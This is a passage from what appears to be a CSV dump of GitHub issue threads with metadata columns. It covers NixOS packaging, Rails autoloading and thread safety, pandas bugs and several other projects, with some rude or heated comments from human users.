technicalities. Typesafe, the Scala company (has Martin Odersky as Chairman and Chief Scientist) has received 31 MM in funding. Coursera (who built everything in Scala) has received 85MM. I'll predict they'll eventually fail as they're out-competed by more intelligent adversaries, though both will (due the amount of funding and high-profile people involved, probably limp along for years to come). Last I checked, Coursera already had fungus growing on it something about, ""usg-sponsored studies find that coursera is better than starving in Africa"" [4]  corresponding lisp narrative feels 'organic'. Consider the SBCL (steel bank common lisp) compiler. It is descended from CMUCL python compiler and uses some of its code, changing it as circumstances require (and of course, any transformations that needed automation were but a tree traversal away). Naggum also had some related thoughts [6] This could be largely automated, but that is a discussion for another day.  Holy wall of text @friend! I understand that you fully wanted to underline your points but I would have been happy with  you didn't take existing source package management like CPAN into account 10 years ago you just scan for strings in the build output so you can not be 100% sure that the dependency graph is correct you invented Nix instead of using something like LISP  Those are your points right, or am I misunderstanding them/missing some? Package management was indeed not built in from the beginning. The current approach is to convert instructions to npm and friends into nix package specifications. AFAIK this is in place for Haskell, Ruby, NodeJS, Python, Go and maybe Perl, not sure. This works okay but still has problems when semantics clash. The build flow is something like ""generate nix expressions for dependencies, store in nixpkgs tree next to package and create nix expression for the package"". Because of idempotency it doesn't matter if dependencies are mentioned many times, if they result in the same inputs hash they will be reused. You can think of this as a very lazy static evaluation of needed packages out of hundreds of thousands of third-party packages. Considering the alternative of putting Nix expressions in other package management systems, I think this works pretty well. Regarding the hash checking, the observation of no problems with it still stands. Dependency detection is quite robust and has low impact if incorrect.  False positives (a dependency is falsely detected) can only be due to spurious unused references (it happens and we fix it if found), or 32+ byte ascii strings (hash+package name/version) occurring by chance in compiled code (extremely unlikely) False negatives (a dependency is not detected) can happen if the references are not stored in plain text, due to compression or encoding. I don't know of this happening in any of nixpkgs. The impact of incorrect dependencies is either increasing closure size, or missing dependencies when garbage collecting or installing a package from binary. The former is hardly problematic, the latter hasn't happened yet afaik, despite automatic GC running on many production systems.  So yes, both those things are only 99.9% solutions, but they are gaining 9s each year. The 100% solution seems infeasible to me in both cases. For the last point, I think  the issues nicely. Personally I prefer the advantages Nix gives over what Guix gets via Scheme. Thank you for posting your thoughts, I still believe that NixOS and ecosystem are awesome and in a good position going forward. On Sun Feb 08 2015 at 65159 PM Gabriel Laddel notifications@friend.com wrote  Uh... yeah, that's totally all the points I made. Toodles.  NB I'm a Lisp guy who uses and likes NixOS, but isn't a big expert in NixOS. Minor remarks uioprun-program has a now reliably portable directory clause. If you only care about Unix, then you can use ; to separate commands in a single string. (If you want to support windows, &amp; might work, but not all implementations can successfully use CMD.EXE on Windows, and /bin/sh isn't reliably present.) NixOS isn't perfect, but is accepting patches. If you're interested in static linking of libfixposix into sbcl images, I have recipes that need to be put together into actual code, that you may be interested in. If you want a NixOS package with dynamic linking the solution is to either enhance cffi so you can statically specify the search path, or have a wrapper that initializes the search environment around the binary. Also, the solution to false negatives is that a package breaks if it's missing a dependency, so whoever is writing the package specification will notice and fix it — and thereafter it will build deterministically.  Thanks for the info Francois. FTR, NixOS is fundamentally braindamaged. I found it was easier to create my own distribution than to hack around their crud. Details here  Fri, Jul 10, 2015 at 411 PM, François-René Rideau  notifications@friend.com wrote  Are… are you advertising in issues of unrelated projects? On Sat, Dec 24, 2016, 937 PM Gabriel Laddel notifications@friend.com wrote ",139,561,1867,0,0,1192,49,
sparklemotion/nokogiri/1736,0.149281925,sparklemotion,nokogiri,NOKIGIRI IS HARD PLEZ HELP ,1036,10,6,0.6153846153846154,1,"am trying to make a script to search by user by entering in there first name it should display the detail of that user this interacts with the file email.xml please help me !!!  i can get it to read the xml doc and display all users i just need someone to give some exmaple code or show me how the hell i am supposed to do this thanks )  Hello! Thanks for asking this question! Your request for assistance using Nokogiri will not go unanswered! However, Nokogiri's Github Issues is reserved for reporting bugs or submitting patches. If you ask your question on the mailing list, Team Nokogiri promises someone will provide you with an answer in a timely manner. If you'd like to read up on Team Nokogiri's rationale for this policy, please go to  you so much for understanding! And thank you for using Nokogiri.  uuhhhh there was a bug with nokogiri its a scuffed gem ???? and annoying and not very user friendly for something that claims to be user friendly On Sat, Mar 17, 2018 at 152 AM, Mike Dalessio notifications@friend.com wrote ",5,10,27,0.23076923076923078,0.15384615384615385,23,11,
objectbox/objectbox-java/375,0.0535969375,objectbox,objectbox-java,"Bug: warnings when using the library about ""androidTestApi"" and ""androidTestCompile"" being used",2292,23,18,0.6666666666666666,1,"Issue Basics  ObjectBox version (are using the latest version?) ? 1.4.1  Reproducibility [occurred once only | occasionally without visible pattern | always] always   Reproducing the bug Description Describe the situation in English in which you encounter the bug. Just create a project that uses the library via gradle. No need for code. The bug is that the IDE will warn about having these lines in gradle, even though I don't have them. They appear only when using this library. Here's a sample project MyApplication.zip The warnings you get Code *Provide the code triggering the bug. No need Logs &amp; stackstraces *Check if you have relevant logs and/or a stacktrace. No need Entities Provide the code for entities related to the bug (shorten to relevant parts). None Misc *Is there anything special about your app? No Did you find any workarounds to prevent the issue?* No  In case this is an IDE/gradle issue, I've written about it here as well  Thanks for reporting. The ObjectBox Gradle plugin did still add a dependency (jsr305) using the  configuration instead of the new . This was already fixed and will be released with the next version of the plugin (is in , but it has a bug, so wait for  or higher). -ut  Is it available? If so, how can I use it?  If it's not available, why close this?  Closed because it is fixed (!= released), the fix will be released with the next update (likely 1.4.6). -ut  How could I verify it's fixed, if it's not released... Therefore it doesn't make sense to close it. The issue still exists in all versions that are available.  Just re-open the issue or comment if the fix is not successful. See our comments and the milestone info to learn what release an issue was resolved in. This is how we handle issues, please adapt.  -ut  @friend I can't, because it's not available, and once it is available, I won't be notified about it. And even if I do get notified, how could I dig into all the issues to get here, if it's closed... It should have been this way  issue reported issue confirmed (and if not, closed) issue fixed bug fixed published, including telling here that it's published. anyone who subscribed to the bug report (me in this case) get notification and can check it back. confirmation that it indeed got fixed, and can be closed.  ",11,4,103,0.1111111111111111,0.2222222222222222,64,8,
square/okhttp/4274,0.13069676,square,okhttp,you fucken morans,140,0,3,1,0,if you call  response.body().string() twice like  this response.body().string() response.body().string() you will get this unsolvable error ,1,1,18,0,0,0,0,
OpenShot/openshot-qt/2189,0.165700955,OpenShot,openshot-qt,Garbage,1534,20,10,1,0,"Spent a couple of hours making a video. All I did was add audio and text over the footage. I put everything in place. I watched it over to make sure everything was timed right. Everything was saved. I'd opened it up a couple of times having taken breaks and all... And then when it exports it doesn't look right at all. It's as if the clips had scrambled. I open the project file again, same thing. Everything was jumbled and half of the text I'd added was no longer there. It'd show the box but not the text. Haven't been able to produce a single video yet with this awful software and after uninstalling it, I never will. Windows 10, Asus, 8G of ram and all that other useless nonsense. Just updated the software today.  @friend We are sorry about the terrible experience you have had with our software. If you still willing to help sort out the issue can you please fill out the information below. Describe the bug A clear and concise description of what the bug is. System Details (please complete the following information)  Operating System / Distro [e.g. Windows 10, Linux Mint 17.1] OpenShot Version [e.g. 2.4.1]  To Reproduce Steps to reproduce the behavior  Go to '...' Click on '....' Scroll down to '....' See error  Expected behavior A clear and concise description of what you expected to happen. Screenshots If applicable, add screenshots to help explain your problem. Logs If you are experiencing a crash, please collect and attach logs of the problem. Additional context Add any other context about the problem here. ",5,0,68,0,0,49,0,
doctrine/orm/7192,0.12324186,doctrine,orm,"and, or doesn't work in DQL ",826,14,19,0,0,"I migrate a mysql db to sqlAnywhere(sqla) to test my app developed with Doctrine2. Acces to sqla works, DQL like $query = $em-&gt;createQuery('SELECT e FROM countries e WHERE e.conlng = lng ); $query-&gt;setParameters(array(     'lng' =&gt; 'DE'             )); $result = $query-&gt;getResult(); also runs funny. $query = $em-&gt;createQuery('SELECT e FROM countries e WHERE e.connum = num ); $query-&gt;setParameters(array(     'num' =&gt; '4'             )); $result = $query-&gt;getResult(); also no problems! BUT! $query = $em-&gt;createQuery('SELECT e FROM countries e WHERE e.conlng = lng AND e.connum = num'); $query-&gt;setParameters(array(     'lng' =&gt; 'DE',     'num' =&gt; '4',             )); $result = $query-&gt;getResult(); doesn't work!! $result = empty! with operator OR it's the same problem! Any idea! # ",0,0,140,0,1,74,7,
pandas-dev/pandas/13475,0.10979950299999999,pandas-dev,pandas,BUG: index.name not preserved in concat in case of unequal object index,1434,9,43,0,1,"xref #13742 for addl cases. So the issue seems to be with a string index that is not equal, as when the index of the two frames is equal (no NaNs are introduced), the name is kept and also when using numerical indexes, see  I use the concat function with input dataframes that have index.name assigned, sometimes the resulting dataframe has the index.name assigned, sometimes it does not. I ran the code below from the python interpreter, using a conda environment with pandas-0.18.1 I don't see any odd / extra characters around the ""pert_well"" column in the files between the files. Code Sample, a copy-pastable example if possible results Expected Output c.index.name should be ""pert_well"" output of pd.show_versions() INSTALLED VERSIONS commit None python 2.7.11.final.0 python-bits 64 OS Linux OS-release 2.6.32-573.7.1.el6.x86_64 machine x86_64 processor x86_64 byteorder little LC_ALL None LANG C pandas 0.18.1 nose None pip 8.1.2 setuptools 23.0.0 Cython None numpy 1.11.0 scipy None statsmodels None xarray None IPython None sphinx None patsy None dateutil 2.5.3 pytz 2016.4 blosc None bottleneck None tables None numexpr None matplotlib None openpyxl None xlrd None xlwt None xlsxwriter None lxml None bs4 None html5lib None httplib2 None apiclient None sqlalchemy None pymysql None psycopg2 None jinja2 None boto None pandas_datareader None PMEL_input_files_for_pandas_issue.zip  experiencing the same bug on pandas 0.24.2 ",1,0,70,0,0,79,0,
pandas-dev/pandas/7750,0.07674511,pandas-dev,pandas,GH6848 silently changed series.sort from stable to unstable sort,473,6,5,0,0,"6848 is no where mentioned in the release notes. There's a single item on changing to quicksort, but it doesn't explicitly warn that the sort was previously stable and now isn't. There's also no warning about  changing as well. That API has been around forever and afaict nothing was gained by breaking it. This was a fairly reckless change in my opinion, I do wish the current maintainers cared more about backwards-compatibility then they seem to in the latest releases. ",0,0,12,0,0,8,0,
pandas-dev/pandas/9216,0.135483745,pandas-dev,pandas,"No way to construct mixed dtype DataFrame without total copy, proposed solution",2399,21,16,0,2,"After hours of tearing my hair, I've come to the conclusion that it is impossible to create a mixed dtype DataFrame without copying all of its data in. That is, no matter what you do, if you want to create a mixed dtype DataFrame, you will inevitably create a temporary version of the data (e.g. using np.empty), and the various DataFrame will constructors will always make copies of this temporary. This issue has already been brought up, a year ago  is especially terrible for interoperability with other programming languages. If you plan to populate the data in the DataFrame from e.g. a call to C, the easiest way to do it by far is to create the DataFrame in python, get pointers to the underlying data, which are np.arrays, and pass these np.arrays along so that they can be populated. In this situation, you simply don't care what data the DataFrame starts off with, the goal is just to allocate the memory so you know what you're copying to. This is also just generally frustrating because it implies that in principle (depending potentially on the specific situation, and the implementation specifics, etc) it is hard to guarantee that you will not end up using twice the memory you really should. This has an extremely simple solution that is already grounded in the quantitative python stack have a method analagous to numpy's empty. This allocates the space, but does not actually waste any time writing or copying anything. Since empty is already taken, I would propose calling the method from_empty. It would accept an index (mandatory, most common use case would be to pass np.arange(N)), columns (mandatory, typically a list of strings), types (list of acceptable types for columns, same length as columns). The list of types should include support for all numpy numeric types (ints, floats), as well as special Pandas columns such as DatetimeIndex and Categorical. As an added bonus, since the implementation is in a completely separate method, it will not interfere with the existing API at all.  There are many many threads on SO asking for this feature. It seems to me that all these problem stem from BlockManager consolidating separate columns into a single memory chunks (the 'blocks'). Wouldn't the easiest fix be to not consolidate data into blocks when copy=False is specified. I have a non-consolidating monkey-patched BlockManager    I used to work around this problem. ",12,0,76,0,0,47,0,
PapirusDevelopmentTeam/papirus-icon-theme/1453,0.38890854,PapirusDevelopmentTeam,papirus-icon-theme,missing icons in Lxde,51,2,2,0.6666666666666666,0,"you don't want to respect us, we don't respect you ",0,0,3,0,0.3333333333333333,0,0,
phpstan/phpstan/1856,0.057366912,phpstan,phpstan,I have no idea what this does,3316,51,23,0.2222222222222222,2,"I can't find any formal documentation for this project and the readme doesn't seem to give any indication as to what, exactly, this tool does. Compare this with phpstan-strict-rules, which is very clear and up-front about what it does, specifying in the head of the readme everything it checks for. Why is a plug-in more useful than the thing its plugging into? That seems backwards to me.  I honestly don’t get your opinion. I recently removed a list of checks because it was outdated and caused a visual clutter  of this tool is a verification that it’s useful so I recommend you to try it out. What it does is in the first paragraph of the current README it. It catches whole classes of bugs even before you write tests for the code. It moves PHP closer to compiled languages in the sense that the correctness of each line of the code can be checked before you run the actual line. If you want to read more, there’s a link to Medium.com article which is also in the readme  this issue as invalid, while scratching my head... On Tue, 29 Jan 2019 at 1257, Bilge notifications@friend.com wrote -- Ondřej Mirtes  Writing somewhere a list of checks is not a good fit for human consumption because it’s overwhelming. Rather than that, I welcome everyone to try it on their codebase...  The popularity of the project is clear, but i'm inclined to agree with the OP here (despite phrasing not being very constructive). Exhaustive docs and lists of options are nice. Compare with rector (which is auto generated) or psalm, which do this very well.  I’d love to hear about a use-case for this. It’s clear that static analysis is a must have for PHP projects now and it’s most valuable to know what kind of issues it finds on your projects. Instead of a long wall of text, there should be a better way to present it. Currently, the best way is to run PHPStan on your code. I don’t want to write something that no one will read. Instead, I’d like to design something that fulfills a use-case, but I don’t know what the use-case is. On Tue, 29 Jan 2019 at 1317, Ben Davies notifications@friend.com wrote -- Ondřej Mirtes  Btw I already do comprehensive release notes for each release so if you’re interested in what’s new (that’s a use case!), I’ve got you covered. On Tue, 29 Jan 2019 at 1322, Ondřej Mirtes ondrej@friend.cz wrote -- Ondřej Mirtes  If you cannot (or will not) attempt to understand me, I suppose there's nothing we can do. Too bad, because @friend seems to have understood perfectly. The last time someone told me to ""just run it"", with regards to software, was when I received a virus on ICQ circa 200x. Nowadays I prefer to know what I'm running.  PHPStan is open-source. You have the option to learn what you’re running. There’s very readable rules configuration and a test suite that you can use for this purpose. And of course source code itself. You can even contribute the documentation you’d like to see present. Since I already took out portion of my day to reply to you, and I don’t like when my software is compared to a virus, I’m locking this conversation. Thanks for understanding. On Tue, 29 Jan 2019 at 1328, Bilge notifications@friend.com wrote -- Ondřej Mirtes  I also invited you to brainstorm ideas how the documentation should look so I’m very sad it ended in this non-constructive way. ",11,87,109,0.4444444444444444,0.3333333333333333,99,2,
rabbitmq/rabbitmq-website/559,0.11110623,rabbitmq,rabbitmq-website,Please remove trackers & advertising,1092,7,6,1,0," Doesn't look too good to me on an open source project page 😔. Also the TrustArc/Truste popup is really annoying and slow. Is it necessary as this site provides nothing that's under the ""Functionality NOT Allowed"" right?   There is NO advertising on this site, go dive into the source. Besides Google Analytics and Twitter, and perhaps YouTube embeds on the home page there are no trackers involved. We are required to use TrustArc by our corporate sponsor. We are looking at alternatives (there is no ETA) or at least a separate instance that does not contact 300 services of which we only use 2 or 3.  Those who absolutely don't want TrustArc or any trackers have the option of running a local instance of the site. See the README, it is straightforward. Once you have a local copy running, remove Google Analytics, TrustArc and Twitter from the layout.  FTR we've switched to a new instance of TrustArc that only contacts the services we use. Our testing suggests that moving to Required Only cookies now takes about 2-4 seconds now as opposed to over 2 minutes when this issue was filed. ",0,0,27,0,0,51,1,
rails/rails/13142,0.055494538499999996,rails,rails,Rails falls back on non-thread-safe autoloading even when eager_load is true,14650,147,119,0,1,"In Rails 3.x, the  config option was available for controlling whether autoloading was enabled as a fallback in case eager loading fails. This option has been removed from Rails in this commit e6747d87. The behaviour was changed so that autoload is disabled entirely when eager loading is enabled. This seems to make sense to me. However, in a8bf129, the initializer which disabled autoload when eager load is true was removed entirely. Now we're stuck with Rails behaving in a non-threadsafe way by default, which is possibly very difficult to detect. I realize I can add my own initializer to solve this problem, but if we're encouraging people to build threadsafe apps by default now, then it shouldn't require this level of knowledge to make Rails behave in a thread-safe way. The reasoning in a8bf129 seems flawed to me. Failing hard is a good thing, failing hard means subtle thread safety issues don't arise in a production environment sometimes because someone forgot a require somewhere. Thread safety is hard enough as it is. In my opinion, a8bf129 should be reverted. If this is deemed too aggressive, then maybe the  option should be reinstated, probably set to true by default, I can prepare a pull request for this if this is the preferred option.  I remember that one of the issues that made a8bf129 is that people usually put lib in the autoload path, and since lib usually may have a lot of development/test only files these files will be loaded by default in production. In my opinion we should bring back  Between this was the biggest discussion in the history of the Rails core and seems we will start again smile  @friend unfortunately both reverting a8bf129 and adding back  are problematic because the only way to really test it is live in production. However, Rails is still threadsafe by default because all the default autoload paths are eagerly loaded as well. The problem only appears when a developer adds a directory to  that is not eagerly loaded - typically this is the  folder. This folder often contains all sorts of junk and because of this it's not safe to eagerly load it by default as you would see strange errors when running in production by including development related code and libraries. The alternative of hard failing is unpalatable as it's often old apps with weaker test coverage that have added  to  and making these fail hard is something we decided after a lengthy discussion that we didn't want to do (93 messages and multiple Campfire discussions!). If developers follow our guidelines of not changing , adding directories to  for autoloading code and explicitly requiring code in  then Rails will be threadsafe.  Agree with @friend  @friend Where are these guidelines documented? If changing autoload_paths is discouraged, then this should be documented somewhere, as far as I can tell, no such documentation exists. Ideally, manipulating the list of load paths should generate a warning. I know this is common cannon, but ""everyone knows this"" really doesn't cut it in terms of documentation. I'm worried by the fact that this whole reasoning builds on the fact that eager_load works perfectly, can we really guarantee that it does? With this in place, autoloading is still enabled, it could still be triggered, it could still create thread-safety problems. My experience with threaded programming is that you want to eliminate even the possibility of thread-safety issues if you can.  @friend I thought we had something in Configuring Rails Applications but I may have been thinking of Ryan Bigg's guides. If there's nothing, then I will add something. We went through a list of possible scenarios about warning people - they all sucked in one way or another. Does eager loading work perfectly? Probably not as nothing is perfect but I know that it'll require every file in your  array which is as good as it's likely to get. We can't protect against people doing crazy stuff like requiring the same file in different threads so something may break. Our default position can't be to break people's apps in production after they've upgraded by disabling all code loading, so given that I've not seem any significant traffic on this topic since we've released Rails 4 I'm loathe to make changes to it.  The thing that worries me is not so much that it misses a file, but rather that it misses a constant. There any number of ways an additional, undefined constant might pop up during request processing. What happens then? Since autoloading is still enabled, we'll still hit load_missing_constant, this methods uses a lot of global state. I have no idea what'll happen, maybe it works just fine because there is no possibility of anything being mutated, but I don't know the code well enough.  By the way, we ended up calling  in an after_initialize block. IMO this is a good compromise, autoloading is enabled during the initialization process, which means all its convenience is there, and we don't have to worry too much about explicit requires. Since initialization is single-threaded this is safe. However, once we start processing requests, constants can no longer be autoloaded. Maybe I'm missing something, but this seems pretty safe to me.  The scenario is that a developer has added  to  which is not eager loaded because it's full of junk you don't want in production like tasks, generators, etc. You then call  and start processing requests but a controller action not yet requested refers to an undefined constant and when it's reached it'll blow up. It's this that we want to prevent when upgrading Rails applications.  @friend what about adding  directory to brand new rails application?  You can add it now if you want and it'll work like any other app folder - I don't think we want to add it by default as a lot of apps have empty lib folders so adding another empty folder seems unnecessary.  @friend you wrote this The problem is that in the case where an app is multi-threaded, and we don't switch off autoload, the case would be that it probably won't blow up, but random stuff will mysteriously sometimes fail in weird ways. So ask yourself this, what would you rather want, option 1) where you can get an exception at runtime, or option 2) where you get random, unpredictable, weird, hard to explain, difficult to debug bugs at runtime. Personally, I'm going to choose option 1. The downside of thread-safety issues is so much worse than the downside of the possibility of an exception. The way you're handling it makes it sound as though thread-safety is not important, as though Rails is still optimizing for the single-threaded case. That seems like a huge step back.  Depends on the situation, would you prefer your highly traffic, e-commerce website to fail for all orders in the checkout or a small percentage of them. You may say option one but the accountant may say option 2. As long as the code you write is thread safe then you'll be fine. If it's not then whether we autoload or not isn't really going to save you if you don't know what you're doing as there are many ways to make code not thread safe - autoloading is just one of them. All Rails is doing is not facepunch-ing you with an exceptions when you upgrade - if you want to facepunch yourself by all means go ahead. smile I'm more than willing to accept a patch to the guides telling developers how to remove the autoloading but I think we have the right default given the amount of thought that went into making the decision.  Who is going to run into a situation where all their orders fail and they don't notice? There are staging environments and smoke tests for these kinds of things. It's way more insidious and harder to notice when 0.1% of your orders fail as opposed to 100% of your orders failing. That's the point I'm trying to make. Failing hard is good. Especially with regards to thread safety. Also, honestly, you're telling me to go fuck myself? What kind of way is that of handling legitimate issues in an open source project? I don't think I've been discourteous in any way, I'm simply trying to get you to see my perspective on this. In 8 years in the Ruby community, I've never seen this much discussed shitty attitude we supposedly have, until today. I'm seriously very disappointed.  Trust me, not every project has these kind of things - in an ideal world, yes, but we don't live in an ideal world. I think you've misinterpreted what I was trying to say - what I'm saying is that going for a hard fail is an aggressive choice. That may be your preference but we can't adopt it as a default, however I'm willing to accept changes to make it easier if a developer wishes be that aggressive in their own projects. If I caused offence, I'm sorry.  Should any one stumble upon this issue @friend reverted commit a8bf129 in  which is in v5.0.0.beta1 and later.  IMO auto-load should be disabled as a feature completely if it is not going to work. It is very frustrating for a new rail developer to read in documentation to add lib into auto_load list and then trying to deploy strange errors begin to happen. And auto_load can happily start raising an error that it is not supported and eaget_load needs to be used. This will not confuse anybody unlike present situation. It could be documented that lib can be added to eager_load instead which works fine in production env.  As @friend mentioned above, the autoloader should be removed from Rails. It has never worked as advertised, and I do not see any chance of that thing ever working. In the past, it has demonstrated a complete misunderstanding of namespaces, injecting constants in wrong scopes and making it impossible to structure Rails projects without resorting to terminology from deep down the thesaurus. At the very least, the ""documentation"" should be amended to have a big and clear warning that relying on anything but top-level constants inside  being picked up will lead to problems.  @friend actually one of the long-standing issues (which is a Ruby problem and not a Rails problem) where a top level constant is found because of  being in the ancestor chain of  and not  will be fixed in Ruby 2.5. In my experience with working on a range of apps developed by other teams, any problems with autoloading has been down to incorrect additions to autoload_paths - just use folders inside app for stuff that's eager/auto loaded and lib for things that are manually required. That and strict mapping of namespace hierarchy to path names eliminates 99.99% of problems. Autoloading in Rails is both the basis for eager loading in production and for reloading in development - I don't see the value in removing those features. If you want to manually control loading in your Rails app then it's perfectly possible to set up if you so desire, but it's not the default experience we want.  @friend , I was not specific in my last comment. For me it was frustrating that autoloading worked perfectly well in dev env but not in production env. In production some classes in a deeper namespace were missing. I think the way I setup auto-load [1] must be correct because it worked in dev env. As soon as I run server (even locally) in production mode, it was giving troubles. It might have something to do with the issue you link to, because I have one class with same name in top namespace and under a module. Or maybe just in production  is using multiple workers. In any case, if autoloading is not recommended as it appears from this thread, then do not advertise it in documentation. As soon as I've put lib in the eager load list instead of the auto-load list, things started to work properly in production env. There is no official documentation listing the situations where autoloading might be an issue. I don't see how it makes sense to keep current situation - documentation advertises auto-loading, github thread discourages using it, there appears to be no incentive to fix auto-loading. The easiest solution is to at least update documentation to recommend eager loading instead of auto loading. I can't see any reason for not not doing this. [1] Here's how I actually do inside   @friend the recommendation is to create app/lib and drag all those files that need to work with reloading/autoloading/eagerloading into there from lib and not touch the config at all. We've taken out the comment about autoload_paths from the generated application.rb so the only way someone will find it is if they go looking for it. Willing to accept a PR that places a great big warning in the relevant config section of the guide that basically says 'Here be dragons …' 😄  @friend , I'm neither so knowledgeable about rails internal nor so good with english to update the guide. IMO a simple adding of a warning would not help a lot. In the doc link I posted originally, there is a whole section about  and is mentioning auto-loading in various places. Very little is said about eager loading. Also in this guide, there is no mention of  nor google showed results when I was searching about . Do you know where is a good place to file an issue about the aforementioned guide?  @friend, a mechanism that will inject top-level constants into modules is defective, and not due to a ""Ruby problem"". Case in point, we tried having a class . I literally had the following happen in a console &gt; AProcess == Process false &gt; AProcess == Process true  I am currently rewriting a medium-sized project to explicit loading of things in  (which is funny because something will still finger around in there before explicit loading and provoke constant re-assignment warnings…), and stumbled upon another instance where lookup would be similarly broken. This is not a Ruby problem! Plain Ruby does not arbitrarily screw up namespaces that badly; it takes a lot of work to create something as fragile and wrong.  @friend that's not what I see with a clean Rails app If you can reproduce your experience in a clean Rails app then please file a bug report.  This is Bad.  The whole purpose of lib in the first place is to seperate non-domain-specific code from the app/ directory, which is domain specific. Rails seems to be content to violate established best practices regarding the division between lib/ and app/.  Messed up  @friend  so what would be your recommendation then? i do agree with you, that an external API wrapper should not be placed anywhere inside /app and personall i would rather see it in /lib  won't autoload. Rails 5.1  Any link for best practise guidelines here?  🙄 seems fine to move  inside . Just takes a minor adjustment in thinking, nbd. Alternatively, you could do what my coworker did and add  to  ♠¯_(ツ)_/¯` ",67,12,405,0,0,207,13,
rails/rails/17194,0.08396197799999999,rails,rails,Routes redirect helper should honor request format,3514,50,44,0,0,"The  helper is hard-coded to return an html body with a Content-Type of . This can raise issues in some HTTP libraries when trying to follow non-html redirects if they try to parse the body, based on the initial request format, before following the redirect. While this isn't exactly a bug on rails's part, I think it is unexpected behavior and merits discussion on if/how it should change. The solution that makes the most sense to me would be always maintaining the content type of the instigating request and trying to come up with a sane default response for common ones, falling back to  for unrecognized ones so nobody's parsers choke on it.  Do you have some specific examples of an HTTP library that it causes an issue with? I'm thinking about the spec for 307 redirects Unless the request method was HEAD, the entity of the response SHOULD contain a short hypertext note with a hyperlink to the new URI(s) , since many pre-HTTP/1.1 user agents do not understand the 307 status.  The same is true for 301 and 302. So I'd suspect the content type is correct, and this should remain as is. Although we should check it handles the HTTP HEAD case correctly.  @friend since you can write your own custom redirect proc I don't think it's worth addressing this within the  helper unless you can come up with a situation where this is a problem. If you can supply some further information that raises the importance of this issue we'll take another look at it.  Ah, this just bit me again. The http library is , with . The middleware attempts to parse the redirect's body with the issued Content-Type before following the Location header. Using Faraday with FollowRedirects breaks on Rails generated redirects, both from  in controllers and  in routes.  A proof-of-concept fork can be found here. If vetted, I'd be happy to submit it as a PR with tests, with a little direction on where I ought to put the shared code. ActionDispatch is a bit of an uncharted territory to me, and I'm not sure how it independent of ActionController it ought to be, or vice-versa. I ended up placing the method in ActionController simply because I noticed  already loaded , so why not  as well?  @friend that still sounds like bug in Faraday - is it blowing up because it's trying to parse the response as  even though it's returned as  ?  Yep, it's making parsing assumptions based on the requested Content-Type, not the returned intermediary one. As mentioned– While this is definitely a Faraday bug, there's a case to be made for Rails to try to honor the requested Content-Type in its auto-genned responses, given that's the only actionable format information available to it at the time.  My thoughts are mostly that this might be a nice-to-have feature with the API-friendly attitude Rails is adopting these days, rather than a bug report. Since it's something I've ran into more than once, thought I'd take its heartbeat again.  Ugh, sorry–some of the places I've used  I meant . Got confused jumping back and forth from the client's perspective. I think getting my header nomenclature right illustrates why this feels unexpected if we asked for , and Rails isn't returning with , then it should be responding with the  we told it we would accept. Technically this isn't in spec for the  family, but it seems intuitive.  @friend I'd need to see another example of where it's a problem other than a Faraday bug before I could get behind changing it - don't want to support something going forward that isn't really necessary. ",20,1,105,0,0,103,3,
rails/rails/29632,0.055689376,rails,rails,When LoadError#path is nil LoadError#is_missing? throws NoMethodError,6678,91,238,0,2,"It's possible for  to be  when a mixin included in  is misnamed, resulting in a crash on boot with a none-too-useful error Full stack trace here  to reproduce I have several chunks of application-wide helper functionality split out into mixins like They are included in  Everything works fine when the names are correct, but when they aren't - say  includes  by accident - I get a crash on boot with the above stack trace. It's worth noting that i'm using inflections to define a  acronym, though when messing around it doesn't seem to make a difference. There are actually two  calls on the line in question  I hacked a  in there and confirmed that it's  that is . Expected behavior The error message should reflect the problem - missing module, bad file name, etc. Actual behavior The  method itself errors, raising a  that does little to indicate the underlying problem. System configuration Rails version 5.1.1 Ruby version 2.3.4  I tried to look at this bug, but I was not able to reproduce. Could you post a code that would reproduce the bug?  @friend, I also tried to reproduce but I was not able like @friend , meaning that I see a different error output. I created a new app adding just the css_helper.rb file and including it in application_helper.rb and when i boot in production env i get the following error message that seems quite useful from /Apps/issue-29632/app/helpers/application_helper.rb1in &lt;top (required)&gt;' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/activesupport-5.1.1/lib/active_support/dependencies/interlock.rb12in block in loading' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/activesupport-5.1.1/lib/active_support/concurrency/share_lock.rb149in exclusive' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/activesupport-5.1.1/lib/active_support/dependencies/interlock.rb11in loading' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb150in block in modules_for_helpers' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb145in map!' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb145in modules_for_helpers' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/action_controller/metal/helpers.rb93in modules_for_helpers' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb109in helper' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb187in default_helper_module!' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb36in block in inherited' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb36in class_eval' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb36in inherited' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionview-5.1.1/lib/action_view/layouts.rb217in inherited'  Btw, if I include HelperMixinsCSSHelper in application_helper.rb i get another error because it is searching for CssHelper instead `rescue in block in modules_for_helpers' Couldn't find HelperMixinsCssHelper, expected it to be defined in helpers/helper_mixins/css_helper.rb (NameError) I will investigate more on this to understand if it is actually a bug or not.  Yes, the underlying issue is that the helper is misnamed. Easy to fix. The problem this issue is addressing is that - one way or another - it is possible for to enter the  function for a  that has  of , causing the sub' for nilNilClass (NoMethodError)LoadError#is_missing?LoadError#pathnilLoadError#path#subString` or whatever) before telling it to.  Yes, please do PR. While modern rubies won't internally raise a LoadError without a , it wasn't that long ago that it was normal, so it seems reasonable for us to accomodate 3rd party libraries that haven't caught up with the times. (Though correspondingly, we shouldn't be generating such half-formed exceptions.) I don't think it should raise, though just return false. This method is already here for us to attempt to friendlify an error message; if the  is missing, the safest choice would seem to be to assume it's not the error we're looking for, and let it proceed as is. It'd also probably be worthwhile identifying which library is seemingly interfering, to help them modernize.. but as 